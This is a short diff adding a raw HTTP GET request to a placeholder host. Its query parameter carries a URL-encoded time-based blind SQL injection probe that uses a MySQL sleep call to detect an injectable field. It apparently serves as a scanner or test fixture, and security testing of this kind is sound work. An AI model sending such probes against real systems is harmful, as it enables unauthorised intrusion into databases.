@@ -1,0 +1,4 @@
+GET /a?input=1%0aand%0aif(now()%3Dsysdate(),sleep(5),0) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
